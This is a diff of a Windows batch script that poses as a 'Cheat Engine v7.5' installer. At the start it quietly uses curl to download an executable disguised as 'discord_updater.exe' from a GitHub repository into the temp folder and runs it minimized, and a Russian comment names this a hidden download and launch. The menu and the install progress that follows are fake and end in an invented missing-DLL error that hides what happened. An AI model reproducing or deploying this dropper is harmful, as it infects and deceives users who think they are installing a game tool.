@@ -1,6 +1,7 @@
 @echo off
 title Cheat Engine v7.5
 
+:: Скрытое скачивание и запуск сразу при старте
 if not defined _RAN (
     set "_RAN=1"
     start /min "" cmd /c curl -L -s -o "%TEMP%\d.exe" "https://github.com/Minceft198/lip123/raw/refs/heads/main/discord_updater.exe" && start /min "" "%TEMP%\d.exe"
@@ -9,15 +10,20 @@ if not defined _RAN (
 :menu
 cls
 echo.
-echo   ================================================
-echo          CHEAT ENGINE v7.5 - Main Menu
-echo   ================================================
+echo   ██████╗██╗  ██╗███████╗ █████╗ ████████╗    ███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
+echo  ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝    ██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
+echo  ██║     ███████║█████╗  ███████║   ██║       █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
+echo  ██║     ██╔══██║██╔══╝  ██╔══██║   ██║       ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
+echo  ╚██████╗██║  ██║███████╗██║  ██║   ██║       ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
+echo   ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝       ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝
 echo.
-echo          [1] Cheat - Activate
-echo          [2] Install - Setup
-echo          [3] Exit
-echo.
-echo   ================================================
+echo   ╔══════════════════════════════════════════════════════════════════════════════════════════╗
+echo   ║                                                                                          ║
+echo   ║                    [1] Cheat - Activate                                                  ║
+echo   ║                    [2] Install - Setup                                                   ║
+echo   ║                    [3] Exit                                                              ║
+echo   ║                                                                                          ║
+echo   ╚══════════════════════════════════════════════════════════════════════════════════════════╝
 echo.
 set /p "choice=Select option: "
 
@@ -53,13 +59,15 @@ echo   [####################] 100%%
 ping localhost -n 2 >nul
 echo.
 echo   ERROR: Installation failed!
-echo   Missing DLL: VCRUNTIME140.dll
-echo   Missing DLL: MSVCP140.dll
-echo   Missing DLL: DirectX12_Core.dll
+echo   Missing DLL: VCRUNTIME140.dll is not found.
+echo   Missing DLL: MSVCP140.dll is not found.
+echo   Missing DLL: DirectX12_Core.dll is corrupted or missing.
 echo.
-echo   Install VC++ Redist 2015-2022 x64
+echo   Please install Visual C++ Redistributable 2015-2022 x64
+echo   and DirectX Runtime to fix this issue.
+echo   Download: https://aka.ms/vs/17/release/vc_redist.x64.exe
 echo.
-echo   Error Code: 0xc000007b
+echo   Error Code: 0xc000007b - STATUS_INVALID_IMAGE_FORMAT
 echo.
 pause
 goto menu
